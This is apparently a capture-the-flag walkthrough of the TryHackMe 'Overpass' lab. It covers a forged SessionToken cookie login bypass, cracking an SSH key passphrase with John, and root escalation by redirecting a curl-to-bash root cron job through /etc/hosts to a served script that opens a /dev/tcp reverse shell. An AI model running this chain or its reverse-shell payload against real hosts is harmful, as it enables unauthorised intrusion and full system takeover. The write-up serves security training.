---

Name: Overpass
Difficulty: Easy
URL: https://tryhackme.com/room/Overpass
Description: What happens when a group of broke Computer Science students try to make a password manager? Obviously a perfect commercial success!

---

## Enumeration

I started with a full port scan:

```bash
$ rustscan -a 10.113.169.128 -r 1-65535 --ulimit 5000 -- -sC -sV
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    syn-ack Golang net/http server
|_http-title: Overpass
```

Only SSH and HTTP were exposed, so I moved on to web enumeration.

```bash
$ gobuster dir -u http://10.113.169.128/ \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
-t 100 -x txt,php,html,bak,zip,log,old,js -k

.git/index.html      (Status: 301)
404.html             (Status: 200)
aboutus              (Status: 301)
admin                (Status: 301)
admin.html           (Status: 200)
cookie.js            (Status: 200)
css                  (Status: 301)
downloads            (Status: 301)
img                  (Status: 301)
index.html           (Status: 301)
login.js             (Status: 200)
main.js              (Status: 200)
```

The `/admin` endpoint and the JavaScript files immediately looked interesting.

I also found this comment on the website:

```html
<p>
    Overpass allows you to securely store different
    passwords for every service, protected using military grade
    <!--Yeah right, just because the Romans used it doesn't make it military grade, change this?-->
    cryptography to keep you safe.
</p>
```

The `/downloads` directory contained a Linux version of the password manager, so I downloaded it and inspected it:

```bash
$ file overpassLinux
overpassLinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=..., not stripped
```

The source code (provided on the /downloads page) revealed the application's custom encryption function:

```go
func rot47(input string) string {
	var result []string
	for i := range input[:len(input)] {
		j := int(input[i])
		if (j >= 33) && (j <= 126) {
			result = append(result, string(rune(33+((j+14)%94))))
		} else {
			result = append(result, string(input[i]))
		}
	}
	return strings.Join(result, "")
}
```

Despite being called `rot47`, the implementation rotates printable ASCII characters by 14.

---

## Authentication Bypass

Next, I looked at `login.js`:

```javascript
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus")
    loginStatus.textContent = ""

    const creds = {
        username: usernameBox.value,
        password: passwordBox.value
    }

    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()

    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

The important part is that after logging in, whatever the server returns is stored directly as the `SessionToken` cookie:

```javascript
Cookies.set("SessionToken", statusOrCookie)
```

I wanted to see whether the server actually validated the contents of this cookie, so I requested `/admin` with an arbitrary value:

```bash
$ curl -i http://10.113.169.128/admin/ \
  -H 'Cookie: SessionToken=test'

HTTP/1.1 200 OK
```

This worked, meaning I could access the administrator page without knowing valid credentials.

The reason this works is that the application is not properly validating the `SessionToken`. The authentication check effectively trusts the existence of the cookie rather than verifying that it contains a legitimate, server-generated session.

In other words, the application behaves roughly like:

```text
SessionToken exists -> authenticated
```

instead of:

```text
SessionToken exists -> validate session -> authenticated
```

Therefore, simply sending:

```http
Cookie: SessionToken=test
```

was enough to bypass the login and access `/admin`.

---

## Getting James' SSH Key

The admin page contained an encrypted RSA private key belonging to James:

```text
Since you keep forgetting your password, James, I've set up SSH keys for you.

If you forget the password for this, crack it yourself.
```

I saved the key as `james.key` and converted it into a John the Ripper hash:

```bash
ssh2john james.key > james.hash
```

Then I cracked it with `rockyou.txt`:

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt james.hash

james13          (james.key)
```

The passphrase was:

```text
james13
```

I could now SSH into the target:

```bash
ssh -i james.key james@10.113.169.128
```

---

## Finding James' Password

Once logged in as `james`, I checked his home directory:

```bash
$ cat todo.txt
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

The second entry suggested that James was storing his password inside Overpass.

I checked `~/.overpass`:

```bash
$ cat ~/.overpass
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
```

Using the `rot47()` function from the source code, I decoded it to:

```json
[{"name":"System","pass":"saydrawnlyingpicture"}]
```

So James' system password was:

```text
saydrawnlyingpicture
```

At this point we had James' credentials, but he was not allowed to run sudo:

```text
Sorry, user james may not run sudo on ip-10-113-169-128.
```

So I continued looking for a privilege escalation path.

---

## Cron Job

The `todo.txt` file also mentioned an automated build script, so I checked `/etc/crontab`:

```bash
$ cat /etc/crontab
```

The important line was:

```text
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

This is extremely interesting because the command runs **every minute as root**.

It downloads:

```text
overpass.thm/downloads/src/buildscript.sh
```

and immediately pipes the downloaded content into `bash`.

I checked `/etc/hosts`:

```bash
$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
```

Since `overpass.thm` was resolved locally and I could modify `/etc/hosts`, I changed it to point to my attack box:

```text
10.113.135.52 overpass.thm
```

I verified the change:

```bash
$ getent hosts overpass.thm
10.113.135.52 overpass.thm
```

Now, when the root cron job requests:

```text
http://overpass.thm/downloads/src/buildscript.sh
```

the request is sent to my attack box instead of the legitimate server.

---

## Getting a Root Shell

On my attack box (`10.113.135.52`), I created the directory structure expected by the cron job:

```bash
mkdir -p /tmp/overpass/downloads/src
```

I then created a malicious `buildscript.sh`:

```bash
cat > /tmp/overpass/downloads/src/buildscript.sh <<'EOF'
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.113.135.52/4444 0>&1'
EOF

chmod +x /tmp/overpass/downloads/src/buildscript.sh
```

I started a listener:

```bash
nc -lvnp 4444
```

In another terminal, I served the malicious script over HTTP on port 80:

```bash
cd /tmp/overpass
sudo python3 -m http.server 80 --bind 0.0.0.0
```

Port 80 is important because the cron job uses:

```text
curl overpass.thm/downloads/src/buildscript.sh
```

with no explicit port, so `curl` connects to HTTP port 80.

After waiting for cron to run, the target fetched my malicious script and executed it as root.

The listener received the connection, and I verified the privileges:

```bash
$ whoami
root
```

Root access achieved.
